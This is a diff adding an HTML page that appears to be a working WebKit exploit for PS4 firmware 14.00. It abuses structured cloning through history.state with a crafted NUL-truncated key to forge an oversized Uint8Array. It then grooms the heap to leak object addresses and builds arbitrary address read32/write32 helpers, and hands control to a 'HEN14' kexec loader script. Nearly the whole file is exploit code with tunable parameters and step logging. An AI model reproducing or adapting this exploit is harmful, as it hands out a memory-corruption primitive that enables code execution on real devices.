@@ -1,0 +1,445 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>14.00 History R/W</title>
+<style>
+  html, body { margin:0; padding:0; background:#0b0d10; color:#c8ced8;
+    font:15px/1.45 "Segoe UI", system-ui, sans-serif; }
+  #state { padding:10px 14px; font-size:20px; font-weight:700; }
+  #state.ok { color:#7fd0a0; }
+  #state.bad { color:#d08a7f; }
+  #state.run { color:#d8c07f; }
+  #prev { padding:0 14px 8px; font:12px/1.4 Consolas, monospace; color:#7a8494; }
+  #log { margin:0; padding:10px 14px; white-space:pre-wrap;
+    font:12px/1.45 Consolas, monospace; background:#11151b;
+    border-top:1px solid #1e2732; min-height:60vh; overflow-y:auto; }
+  #expFrame { position:fixed; top:0; left:0; right:0; bottom:0; width:100vw; height:100vh;
+    border:0; background:#0a0a0a; z-index:0; }
+  #state, #prev, #log { position:relative; z-index:1; }
+</style>
+</head>
+<body>
+<div id="state">starting...</div>
+<div id="prev"></div>
+<pre id="log"></pre>
+<iframe id="expFrame" src="./research/exploit.html" title="PS4 14.00 WebKit Entry"></iframe>
+<script src="./hen14/kexec.js"></script>
+<script>
+(function () {
+  "use strict";
+
+  // ---------------------------------------------------------------------
+  // This is a direct port of two research probes that were demonstrated on
+  // retail PS4 firmware 14.00:
+  //   clone_history_jsarray_storage_v4.js   -> forged Uint8Array + JSArray slot
+  //   clone_history_addressed_object_rw_v4.js -> per-page base + object write
+  // The work is kept SYNCHRONOUS on purpose: the original probes never yield
+  // to the event loop between grooming steps, and yielding would let GC move
+  // the very objects whose layout this depends on.
+  // ---------------------------------------------------------------------
+
+  var MARK_KEY = "rw1400-mark";
+  var STATUS_KEY = "rw1400-status";
+
+  // Window sizes are tunable from the URL so you can retry without editing
+  // the file, e.g. ?scan=8388608 if the JSArray slot lands further out.
+  function intParam(name, def, lo, hi) {
+    try {
+      var v = parseInt(new URLSearchParams(location.search).get(name), 10);
+      if (Number.isFinite(v) && v >= lo && v <= hi) return v;
+    } catch (e) {}
+    return def;
+  }
+  var MAP_LIMIT = intParam("map", 4194304, 65536, 16777216);
+  var SCAN_LIMIT = intParam("scan", 4194304, 65536, 16777216);
+  var ANCHOR_LIMIT = intParam("anchor", 2097152, 4096, 16777216);
+
+  var logEl = document.getElementById("log");
+  var stateEl = document.getElementById("state");
+  var prevEl = document.getElementById("prev");
+  var lines = [];
+
+  function push(tag, detail) {
+    lines.push(tag + (detail ? "  " + detail : ""));
+  }
+  function flush() {
+    logEl.textContent = lines.join("\n");
+  }
+  // Crash localization: a synchronous localStorage write survives the tab
+  // dying, so after a crash you can reload and see the last step reached.
+  function mark(name) {
+    try { localStorage.setItem(MARK_KEY, name); } catch (e) {}
+  }
+  function setState(t, cls) {
+    stateEl.textContent = t;
+    stateEl.className = cls || "";
+  }
+  function hex32(v) { return "0x" + (v >>> 0).toString(16).padStart(8, "0"); }
+
+  try {
+    var prior = localStorage.getItem(MARK_KEY);
+    if (prior) prevEl.textContent = "previous run reached: " + prior;
+  } catch (e) {}
+
+  // Property name that structured clone truncates at the first NUL, so the
+  // cloned graph writes the forged typed-array header into that key.
+  function makeKey() {
+    var bytes = [0, 0, 0, 0x16, 0x02, 8];
+    for (var i = 1; i < 8; i++) bytes.push(0);
+    bytes.push(0xf8);
+    for (var j = 1; j < 8; j++) bytes.push(0xff);
+    bytes.push(0x13, 3, 0, 0xff, 0xff, 0xff, 0xff);
+    var chars = [];
+    for (var k = 0; k < bytes.length; k += 2)
+      chars.push(String.fromCharCode(bytes[k] | (bytes[k + 1] << 8)));
+    return (chars.join("") + "A".repeat(256)).slice(0, 256);
+  }
+
+  function runHen14(note) {
+    if (!window.HEN14) {
+      push("HEN14", "adapter-missing");
+      flush();
+      return;
+    }
+    window.HEN14.run({
+      note: note,
+      log: function (tag, detail) { push(tag, detail); flush(); },
+      flush: flush,
+    });
+  }
+
+  function run() {
+    mark("start");
+    setState("running...", "run");
+    push("UA", navigator.userAgent);
+    push("START", "firmware 14.00 browser primitive");
+    push("WINDOWS", "map=" + MAP_LIMIT + " scan=" + SCAN_LIMIT +
+      " anchor=" + ANCHOR_LIMIT);
+    flush();
+
+    if (typeof structuredClone !== "function")
+      throw new Error("structuredClone missing");
+
+    // ---- stage 1: forged view + live JSArray slot ----------------------
+    mark("stage1-build");
+    var backing = new ArrayBuffer(8, { maxByteLength: 16 });
+    new Uint8Array(backing).fill(0x41);
+    var fixed = new ArrayBuffer(65536);
+    new Uint8Array(fixed).fill(0x91);
+
+    var filler = new Array(253);
+    filler[0] = BigInt(1) << BigInt(40);
+    filler[1] = backing;
+    filler[2] = fixed;
+    for (var n = 3; n < 27; n++) {
+      var neighbor = new ArrayBuffer(8, { maxByteLength: 16 });
+      new Uint8Array(neighbor).fill(0x40 + n);
+      filler[n] = neighbor;
+    }
+    for (var j = 27; j < filler.length; j++) filler[j] = {};
+
+    var shared = { marker: 0x51515151 };
+    var input = { filler: filler, first: shared, second: shared };
+    input[makeKey()] = 0;
+
+    history.replaceState(input, "");
+    mark("stage1-stored");
+
+    var output = history.state;
+    if (!output) throw new Error("history.state came back empty");
+
+    var target = output.filler[1];
+    var synthetic = output["\u0000"];
+    var cloned = new Uint8Array(output.filler[2]);
+
+    var valid =
+      synthetic instanceof Uint8Array &&
+      synthetic.buffer === target &&
+      synthetic.byteOffset === 8 &&
+      synthetic.length > 1e12 &&
+      target.byteLength === 8 &&
+      cloned.length === 65536;
+
+    push("STAGE1-VIEW",
+      "valid=" + valid +
+      " len=" + (synthetic ? synthetic.length : "n/a") +
+      " offset=" + (synthetic ? synthetic.byteOffset : "n/a") +
+      " backing=" + (target ? target.byteLength : "n/a"));
+    flush();
+
+    if (!valid) throw new Error("forged view did not appear (wrong firmware?)");
+
+    // ---- map the region and find the detached 64 KiB buffer ------------
+    mark("stage1-map");
+    var mapBaseline = new Uint8Array(MAP_LIMIT);
+    for (var b = 0; b < MAP_LIMIT; b++) mapBaseline[b] = synthetic[b];
+
+    cloned.fill(0xc4);
+    var run = 0, first = -1, candidates = 0, mapped = 0;
+    for (var q = 0; q < MAP_LIMIT; q++) {
+      if (synthetic[q] !== mapBaseline[q]) mapped++;
+      if (synthetic[q] === 0xc4 && mapBaseline[q] === 0x91) run++;
+      else run = 0;
+      if (run === 65536) { first = q - 65535; candidates++; }
+    }
+    cloned.fill(0x91);
+
+    var regionRestored = false;
+    if (candidates === 1) {
+      regionRestored = true;
+      for (var rr = first; rr < first + 65536; rr++)
+        if (synthetic[rr] !== 0x91) { regionRestored = false; break; }
+    }
+
+    push("STAGE1-MAP",
+      "mapped=" + mapped + " candidates=" + candidates +
+      " at=" + first + " restored=" + regionRestored);
+    flush();
+
+    if (candidates !== 1 || !regionRestored)
+      throw new Error("fixed buffer not found (candidates=" + candidates + ")");
+
+    // ---- release the 64 KiB buffer, reuse its slot for a JSArray -------
+    mark("stage1-release");
+    var a = { marker: "A" };
+    var bObject = { marker: "B" };
+    structuredClone(0, { transfer: [output.filler[2]] });
+    var array = new Array(8192).fill(a);
+
+    var baseline = new Uint8Array(SCAN_LIMIT);
+    for (var s = 0; s < SCAN_LIMIT; s++) baseline[s] = synthetic[s];
+
+    var firstChange = -1, secondChange = -1, firstCount = 0, secondCount = 0;
+
+    array[0] = bObject;
+    for (var x = 0; x < SCAN_LIMIT; x++) {
+      if (synthetic[x] !== baseline[x]) {
+        if (firstChange < 0) firstChange = x;
+        firstCount++;
+      }
+    }
+    array[0] = a;
+
+    array[1] = bObject;
+    for (var y = 0; y < SCAN_LIMIT; y++) {
+      if (synthetic[y] !== baseline[y]) {
+        if (secondChange < 0) secondChange = y;
+        secondCount++;
+      }
+    }
+    array[1] = a;
+
+    var restored = array[0] === a && array[1] === a;
+
+    function matchesBaseline(at) {
+      for (var t = 0; t < 8; t++)
+        if (synthetic[at + t] !== baseline[at + t]) return false;
+      return true;
+    }
+
+    var slotToggleOk = false;
+    if (firstChange >= 0 && secondChange === firstChange + 8 &&
+        secondChange + 8 < SCAN_LIMIT && restored) {
+      var cleanBefore = matchesBaseline(firstChange) &&
+        matchesBaseline(secondChange);
+      array[0] = bObject;
+      var firstOnly = !matchesBaseline(firstChange) &&
+        matchesBaseline(secondChange);
+      array[0] = a;
+      var firstRestored = matchesBaseline(firstChange) &&
+        matchesBaseline(secondChange);
+      array[1] = bObject;
+      var secondOnly = matchesBaseline(firstChange) &&
+        !matchesBaseline(secondChange);
+      array[1] = a;
+      var secondRestored = matchesBaseline(firstChange) &&
+        matchesBaseline(secondChange);
+      slotToggleOk = cleanBefore && firstOnly && firstRestored &&
+        secondOnly && secondRestored && array[0] === a && array[1] === a;
+    }
+
+    push("STAGE1-SLOTS",
+      "first=" + firstChange + "(" + firstCount + ")" +
+      " second=" + secondChange + "(" + secondCount + ")" +
+      " toggle=" + slotToggleOk + " restored=" + restored);
+    flush();
+
+    if (!slotToggleOk) throw new Error("JSArray slots not paired");
+
+    var state = { view: synthetic, index: firstChange, array: array, a: a, b: bObject };
+    mark("stage1-pass");
+    push("PASS", "forged Uint8Array + live JSArray slot");
+    flush();
+
+    // ---- stage 2: calibrate this page's base, then write an object -----
+    mark("stage2-anchor");
+    var view = state.view;
+
+    function matches(at, value) {
+      return view[at] === (value & 255) &&
+        view[at + 1] === ((value >>> 8) & 255) &&
+        view[at + 2] === ((value >>> 16) & 255) &&
+        view[at + 3] === ((value >>> 24) & 255);
+    }
+    function wordOf(value) {
+      var bytes = [];
+      try {
+        state.array[0] = value;
+        for (var b2 = 0; b2 < 8; b2++) bytes.push(view[state.index + b2]);
+      } finally {
+        state.array[0] = state.a;
+      }
+      var out = "0x";
+      for (var h = 7; h >= 0; h--)
+        out += bytes[h].toString(16).padStart(2, "0");
+      return out;
+    }
+
+    var anchor = { marker: 0x11223344 };
+    state.addressAnchor = anchor;
+    var anchorWord = wordOf(anchor);
+
+    var cands = [], count = 0;
+    for (var i = 0; i + 3 < ANCHOR_LIMIT; i++) {
+      if (matches(i, 0x11223344)) {
+        count++;
+        if (cands.length < 32) cands.push(i);
+      }
+    }
+    push("STAGE2-ANCHOR", "word=" + anchorWord + " candidates=" + count);
+    flush();
+    if (!count || count > 32) throw new Error("anchor candidates " + count);
+
+    var changed = [];
+    try {
+      anchor.marker = 0x55667788;
+      for (var c = 0; c < cands.length; c++)
+        if (matches(cands[c], 0x55667788)) changed.push(cands[c]);
+    } finally {
+      anchor.marker = 0x11223344;
+    }
+    if (changed.length !== 1 || !matches(changed[0], 0x11223344))
+      throw new Error("anchor live count " + changed.length);
+
+    var anchorIndex = changed[0];
+    var viewBase = Number(anchorWord) + 8 - anchorIndex;
+    if (!Number.isSafeInteger(viewBase) || viewBase <= 0 || viewBase % 4096 !== 0)
+      throw new Error("base not page aligned");
+
+    mark("stage2-base");
+    push("STAGE2-BASE",
+      "0x" + viewBase.toString(16) + " (anchor index " + anchorIndex + ")");
+    flush();
+
+    var spacer = [];
+    for (var sp = 0; sp < 256; sp++) spacer.push({ value: sp });
+    state.addressSpacer = spacer;
+
+    var tgt = { marker: 0x31425364 };
+    state.addressTarget = tgt;
+    var targetWord = wordOf(tgt);
+    var targetIndex = Number(targetWord) + 8 - viewBase;
+    if (!Number.isSafeInteger(targetIndex) || targetIndex < 0 ||
+        targetIndex + 3 >= SCAN_LIMIT)
+      throw new Error("target outside window");
+
+    var predictedOld = matches(targetIndex, 0x31425364);
+    var propertyMutation = false;
+    try {
+      tgt.marker = 0x65768798;
+      propertyMutation = matches(targetIndex, 0x65768798);
+    } finally {
+      tgt.marker = 0x31425364;
+    }
+
+    push("STAGE2-TARGET",
+      "word=" + targetWord + " index=" + targetIndex +
+      " predicted=" + predictedOld + " live=" + propertyMutation);
+    flush();
+
+    if (!predictedOld || !propertyMutation || !matches(targetIndex, 0x31425364))
+      throw new Error("predicted slot is not live");
+
+    var original = [];
+    for (var o = 0; o < 4; o++) original.push(view[targetIndex + o]);
+
+    mark("stage2-write");
+    var aliasChanged = false, anchorUnchanged = false, aliasRestored = false;
+    try {
+      for (var w = 0; w < 4; w++)
+        view[targetIndex + w] = (0x12345678 >>> (w * 8)) & 255;
+      aliasChanged = tgt.marker === 0x12345678 &&
+        matches(targetIndex, 0x12345678);
+      anchorUnchanged = anchor.marker === 0x11223344;
+    } finally {
+      for (var r = 0; r < 4; r++) view[targetIndex + r] = original[r];
+      aliasRestored = tgt.marker === 0x31425364 &&
+        matches(targetIndex, 0x31425364) && state.array[0] === state.a;
+    }
+
+    push("STAGE2-WRITE",
+      "wrote=" + aliasChanged + " anchor_safe=" + anchorUnchanged +
+      " restored=" + aliasRestored);
+    flush();
+
+    if (!(aliasChanged && anchorUnchanged && aliasRestored))
+      throw new Error("view write did not take");
+
+    // ---- address-directed helpers for this page session ----------------
+    // view[i] is the byte at address (viewBase + i), so an arbitrary address
+    // is just an index. These stay valid only while this page lives.
+    var helpers = {
+      base: viewBase,
+      index: targetIndex,
+      read32: function (addr) {
+        var at = addr - viewBase;
+        if (at < 0 || at + 4 > SCAN_LIMIT) throw new Error("read out of window");
+        return (view[at] | (view[at + 1] << 8) | (view[at + 2] << 16) |
+          (view[at + 3] << 24)) >>> 0;
+      },
+      write32: function (addr, value) {
+        var at = addr - viewBase;
+        if (at < 0 || at + 4 > SCAN_LIMIT) throw new Error("write out of window");
+        for (var k = 0; k < 4; k++) view[at + k] = (value >>> (k * 8)) & 255;
+      }
+    };
+    window.__rw1400 = helpers;
+
+    // Prove the helpers against the calibrated target.
+    var addrOk = helpers.read32(viewBase + targetIndex) === 0x31425364;
+    push("HELPERS", "read32(viewBase+index)=0x" +
+      hex32(helpers.read32(viewBase + targetIndex)).slice(2) +
+      " ok=" + addrOk);
+    flush();
+    if (!addrOk) throw new Error("address helper disagrees with calibration");
+
+    mark("pass");
+    try { localStorage.setItem(STATUS_KEY, "pass"); } catch (e) {}
+    push("PASS", "address-directed read/write, view base 0x" +
+      viewBase.toString(16));
+    push("NOTE", "browser R/W only - this is not a jailbreak and does not load HEN");
+    flush();
+    setState("R/W WORKS", "ok");
+    runHen14("browser primitive established; payload check");
+  }
+
+  try {
+    run();
+  } catch (e) {
+    push("FAIL", (e && e.message) || String(e));
+    flush();
+    setState("FAILED", "bad");
+    runHen14("exploit failed; payload check only");
+    try { localStorage.setItem(STATUS_KEY, "fail: " + ((e && e.message) || e)); }
+    catch (e2) {}
+  } finally {
+    // Free the serialized graph. The forged view itself stays usable until
+    // this page goes away.
+    try { history.replaceState(null, ""); } catch (e3) {}
+  }
+})();
+</script>
+</body>
+</html>
